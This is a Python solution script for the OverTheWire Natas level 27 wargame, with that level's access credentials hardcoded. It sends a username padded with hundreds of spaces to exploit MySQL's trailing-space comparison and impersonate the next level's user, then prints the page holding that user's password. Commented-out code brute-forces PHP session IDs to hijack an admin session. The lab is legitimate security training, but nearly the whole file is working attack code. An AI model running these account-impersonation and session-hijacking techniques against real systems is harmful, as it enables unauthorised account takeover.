# -*- coding: UTF-8-*-

import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
user = 'natas27'
url  = 'http://natas27.natas.labs.overthewire.org'


#cookies are encode like this:
# 123-<username> as hex 

r = requests.Session();
r.auth = (user,key)

# ll MySQL collations are of type PADSPACE. This means that all CHAR and VARCHAR values in MySQL are compared without regard to any trailing spaces.
# https://stackoverflow.com/questions/16724574/mysql-select-fields-containing-leading-or-trailing-whitespace

response = r.get(url)
flag = r.get(url + '?password=asd&username=natas28' +  ' '*666 + 'z')
flag = r.get(url + '?password=asd&username=natas28' )
print (flag.text)

# response = r.post(url + '?debug' ,  data={'name[]' : 'admin'})

# print response.headers
# print response.text

# for i in range(1,641):

#     session_string = `i` + '-admin'
#     print 'request sessionid', str(i)
    
#     response = r.get(url, cookies={'PHPSESSID': session_string.encode('hex') })
#     if ( 'Password:' in response.text ):
#         print response.text
#         break


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
